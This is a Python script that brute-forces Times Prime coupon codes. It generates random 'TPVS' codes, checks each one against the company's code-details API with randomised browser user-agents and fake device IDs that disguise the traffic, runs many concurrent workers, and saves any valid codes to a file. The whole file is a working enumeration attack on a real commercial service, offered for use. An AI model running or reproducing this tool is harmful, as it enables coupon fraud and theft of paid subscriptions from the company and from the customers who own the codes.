import random
import string
import uuid, requests, asyncio


def device_id():
        unique_id = str(uuid.uuid4())
        unique_id = unique_id.replace('-', '')
        timestamp = str(int(uuid.uuid1().time))
        return f"{unique_id}-{timestamp}"


async def generate_coupon(pattern="TPVSXXXXXXXXXX"):
        coupon = ""

        for char in pattern:
                if char == 'X':
                        coupon += random.choice(string.ascii_uppercase +
                                                string.digits)
                else:
                        coupon += char
        return coupon


def random_ua():
        android_versions = ["Android 10", "Android 11", "Android 12"]
        ios_versions = ["iOS 14", "iOS 15"]
        windows_versions = ["Windows 10", "Windows 11"]
        mac_versions = [
            "Macintosh; Intel Mac OS X 10_15",
            "Macintosh; Intel Mac OS X 10_16"
        ]

        android_ua = f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Mobile Safari/537.36"
        ios_ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(ios_versions)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(12, 14)}.0 Mobile/15E148 Safari/604.1"
        windows_ua = f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Safari/537.36"
        mac_ua = f"Mozilla/5.0 ({random.choice(mac_versions)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Safari/537.36"

        ua_list = [android_ua, ios_ua, windows_ua, mac_ua]
        return random.choice(ua_list)


async def tp_code_checker(code: str):
        did = device_id()
        rid = str(uuid.uuid4())
        url = f"https://middleware.timesprime.com/mw/concurrent/v1/codeDetails/{code}?cid=TIMES_PRIME&pid=WEB&rid={rid}&deviceId={did}"
        headers = {
            "Origin": "https://www.timesprime.com",
            "Referer": "https://www.timesprime.com/",
            "user-agent": random_ua()
        }
        response = requests.get(url, headers=headers)
        try:
                rjson = response.json()
                return rjson
        except:
                return {
                    "responseMessage": response.text,
                    "success": False,
                    "code": code
                }


async def main(threads_limit, save_in_file: str = "codes.txt"):

        async def generate_coupons():
                for _ in range(100):
                        code = await generate_coupon()
                        rjson = await tp_code_checker(code)
                        success = rjson['success']
                        msg = "\nCode = {}\nSuccess = {}\nMsg = {}".format(
                            code, success, rjson['responseMessage'])
                        if success:
                                print("Yahooo! | Hitted = {}", code)
                                with open(save_in_file, "a",
                                          encoding="utf-8") as file:
                                        file.write(code + "\n")
                        else:
                                print(msg)

        tasks = [generate_coupons() for _ in range(threads_limit)]
        for task in asyncio.as_completed(tasks):
                await task


if __name__ == "__main__":
        threads_limit = int(input("Enter the number of threads: "))
        asyncio.run(main(threads_limit))
